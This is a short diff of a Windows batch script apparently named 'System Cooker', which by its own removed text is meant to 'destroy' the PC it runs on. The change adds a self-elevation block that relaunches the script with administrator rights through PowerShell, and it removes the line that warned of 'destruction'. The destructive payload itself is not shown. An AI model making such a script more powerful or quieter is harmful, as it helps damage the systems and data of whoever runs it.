@@ -1,9 +1,16 @@
 @echo off
-title System Cooker
-color 0c
+title System Cooker - Admin Mode
 
+:: Check if running as Administrator
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Not running as Administrator. Restarting with elevated privileges...
+    powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
+    exit /b
+)
+
+echo Running as Administrator.
 echo Starting PC Cooker...
-echo Waiting 10 seconds before destruction...
 echo.
 
 :: Wait 10 seconds
